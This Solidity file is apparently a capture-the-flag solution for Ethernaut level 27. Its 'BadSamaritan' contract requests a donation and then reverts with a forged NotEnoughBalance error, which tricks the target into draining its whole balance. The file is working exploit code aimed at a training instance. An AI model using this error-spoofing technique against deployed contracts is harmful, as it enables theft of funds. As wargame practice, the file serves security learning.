// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel27.sol";

contract BadSamaritan {

    error NotEnoughBalance();

    GoodSamaritan goodsamaritan  = GoodSamaritan(0x85d179AADA4E8C697f53d2d3241bd7aBe3017109); //ethernaut instance address
    function attax() external {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}

